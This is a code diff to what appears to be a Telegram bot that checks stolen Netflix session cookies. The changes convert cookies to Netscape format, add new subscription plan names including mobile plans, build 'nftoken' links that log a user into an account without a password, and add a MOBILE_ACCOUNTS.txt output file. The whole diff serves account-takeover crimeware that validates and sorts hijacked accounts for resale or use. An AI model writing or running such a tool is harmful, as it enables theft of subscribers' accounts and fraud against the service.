@@ -428,8 +428,12 @@ def extract_netflix_cookie_bundles(content):
                 elif len(lst) == 1:
                     selected.append(lst[0])
             selected.sort(key=lambda x: x.get("position", 0))
+            netscape = "\n".join(
+                f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}"
+                for e in selected
+            )
             cookies = {e["name"]: e["value"] for e in selected}
-            bundles.append({"cookies": cookies})
+            bundles.append({"netscape_text": netscape, "cookies": cookies})
         return bundles
     
     for extractor in (extract_json_entries, extract_netscape_entries):
@@ -545,12 +549,14 @@ def derive_plan_info(info, is_subscribed):
     if not is_subscribed and not raw_plan:
         return "free", "Free"
     norm = normalize_plan_key(raw_plan) if raw_plan else ""
-    if norm in ("premium", "premium_plan"):
+    if norm in ("premium", "premium_plan", "premium_extra_member"):
         return "premium", "Premium"
-    if norm in ("standard", "estandar"):
+    if norm in ("standard", "estandar", "standard_with_ads"):
         return "standard", "Standard"
-    if norm in ("basic", "basico"):
+    if norm in ("basic", "basico", "essential"):
         return "basic", "Basic"
+    if norm in ("mobile", "ponsel", "seluler"):
+        return "mobile", "Mobile"
     streams = info.get("maxStreams")
     if streams:
         try:
@@ -559,6 +565,8 @@ def derive_plan_info(info, is_subscribed):
                 return "premium", "Premium"
             if streams >= 2:
                 return "standard", "Standard"
+            if streams == 1:
+                return "basic", "Basic"
         except:
             pass
     return "unknown", "Unknown"
@@ -639,6 +647,10 @@ def create_nftoken(cookie_dict, attempts=1):
 def build_nftoken_links(token, mode):
     if not token:
         return []
+    if mode == "pc":
+        return [("PC Login", f"https://netflix.com/?nftoken={token}")]
+    if mode == "mobile":
+        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={token}")]
     return [("PC Login", f"https://netflix.com/?nftoken={token}")]
 
 def get_account_page(session, timeout=20):
@@ -660,7 +672,7 @@ def get_account_page(session, timeout=20):
     return "", 0, {}
 
 
-# ==================== RESULT FORMATTING (مضبوطة زي الأول) ====================
+# ==================== RESULT FORMATTING (زي الأول بالتفاصيل الكاملة) ====================
 
 def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None, html_content=""):
     if config is None:
@@ -874,6 +886,7 @@ STEP 3: Get Results
    - PREMIUM_ACCOUNTS.txt (Premium plans)
    - STANDARD_ACCOUNTS.txt (Standard plans)
    - BASIC_ACCOUNTS.txt (Basic plans)
+   - MOBILE_ACCOUNTS.txt (Mobile plans)
    - FREE_ACCOUNTS.txt (Free accounts)
    - PARTIAL_DATA.txt (Limited data)
 
@@ -1073,7 +1086,7 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 else:
                     results_by_plan["premium"].append(result)
                 target_key = plan_key if (plan_key and plan_key in results_by_plan) else "premium"
-                results_by_plan[target_key].append("")  # separator
+                results_by_plan[target_key].append("")
                 stats['valid'] += 1
             elif result_type == "free":
                 results_by_plan["free"].append(result)
